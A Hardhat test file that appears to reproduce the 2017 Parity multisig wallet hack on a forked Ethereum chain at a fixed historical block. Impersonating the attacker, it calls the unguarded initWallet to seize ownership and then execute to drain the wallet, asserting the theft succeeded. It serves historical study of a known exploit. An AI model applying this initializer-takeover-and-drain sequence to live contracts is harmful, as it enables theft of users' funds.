const { expect } = require("chai");
const { ethers } = require("hardhat");

const walletAddress = "0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e";
const hackerAddress = "0xB3764761E297D6f121e79C32A65829Cd1dDb4D32";
const abi = [
    "function initWallet(address[] _owners, uint _required, uint _daylimit)",
    "function execute(address _to, uint _value, bytes _data) external"
]
const blockNumber = 4043801;

describe("Parity Hack", () => {
    let hacker;
    let wallet;

    beforeEach(async () => {
        // impersonating the hacker's account.
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [hackerAddress],
        });
        hacker = await ethers.getSigner(hackerAddress);
        wallet = new ethers.Contract(walletAddress, abi, hacker);
    });

    it(`Should be block number: ${blockNumber}`, async () => {
        const _blockNumber = await ethers.provider.getBlockNumber();
        expect(_blockNumber).to.equal(blockNumber);
    });

    it("Should steal funds and update balances", async () => {
        const initialWalletBal = await ethers.provider.getBalance(walletAddress);
        const initialHackerBal = await ethers.provider.getBalance(hackerAddress);

        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`wallet balance prior to the hack --> ${ethers.utils.formatEther(initialWalletBal)} Eth`);
        console.log(`hacker balance prior to the hack --> ${ethers.utils.formatEther(initialHackerBal)} Eth`);
        expect(Math.trunc(Number(initialWalletBal))).to.be.greaterThan(0);

        await wallet.connect(hacker).execute(hackerAddress, initialWalletBal, "0x");
        const finalWalletBal = await ethers.provider.getBalance(walletAddress);
        const finalHackerBal = await ethers.provider.getBalance(hackerAddress);
        console.log(`wallet balance after the hack --> ${ethers.utils.formatEther(finalWalletBal)} Eth`);
        console.log(`hacker balance after the hack --> ${ethers.utils.formatEther(finalHackerBal)} Eth`);
        
        const hackedAmount = finalHackerBal.sub(initialHackerBal);
        console.log(`Succesfully hacked --> ${ethers.utils.formatEther(hackedAmount)}Eth`);
        expect(finalWalletBal).to.equal(0);
        
    });

    
});
